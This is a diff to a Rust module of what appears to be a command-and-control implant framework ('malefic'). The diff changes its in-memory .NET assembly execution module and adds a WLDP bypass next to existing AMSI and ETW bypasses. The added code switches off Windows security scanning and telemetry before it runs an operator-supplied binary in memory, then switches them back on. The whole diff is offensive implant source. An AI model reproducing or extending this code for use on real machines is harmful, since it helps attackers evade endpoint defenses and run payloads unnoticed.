@@ -1,11 +1,11 @@
-use crate::{check_field, check_field_optional, check_request, to_error, Module, Result, TaskResult};
+use crate::{check_request, Module, Result, TaskResult};
 use async_trait::async_trait;
-use malefic_helper::protobuf::implantpb::spite::Body;
-use malefic_helper::protobuf::implantpb::AssemblyResponse;
-use malefic_helper::win::kit::bypass::{bypass_amsi, bypass_etw, enable_amsi, enable_etw};
+use malefic_proto::proto::implantpb::spite::Body;
+use malefic_proto::proto::modulepb::BinaryResponse;
+use malefic_helper::win::kit::bypass::{bypass_amsi, bypass_etw, bypass_wldp, enable_amsi, enable_etw, enable_wldp};
 use malefic_helper::win::kit::clr::exec_assemble_in_memory;
 use malefic_trait::module_impl;
-use prost::Message;
+
 
 pub struct ExecuteAssembly {}
 
@@ -19,10 +19,10 @@ impl Module for ExecuteAssembly {
         receiver: &mut crate::Input,
         sender: &mut crate::Output,
     ) -> Result {
-        let clr_request = check_request!(receiver, Body::ExecuteClr)?;
-        let request = check_field_optional!(clr_request.execute_binary)?;
-        let amsi_bypass = clr_request.amsi_bypass;
-        let etw_bypass = clr_request.etw_bypass;
+        let request = check_request!(receiver, Body::ExecuteBinary)?;
+        let amsi_bypass = request.param.contains_key("bypass_amsi");
+        let etw_bypass = request.param.contains_key("bypass_etw");
+        let wldp_bypass = request.param.contains_key("bypass_wldp");
 
         let bin = request.bin;
         let result: Vec<u8>;
@@ -33,18 +33,25 @@ impl Module for ExecuteAssembly {
             if etw_bypass {
                 bypass_etw();
             }
+            if wldp_bypass {
+                bypass_wldp();
+            }
             let ret = exec_assemble_in_memory(&bin, request.args);
-            result = ret.encode_to_vec();
+            result = ret.as_bytes().to_vec();
             if amsi_bypass {
                 enable_amsi();
             }
             if etw_bypass {
                 enable_etw();
             }
+            if wldp_bypass {
+                enable_wldp();
+            }
         }
 
-        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(AssemblyResponse{
+        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
             status: 0,
+            message: Vec::new(),
             data: result,
             err: "".to_string(),
         })))
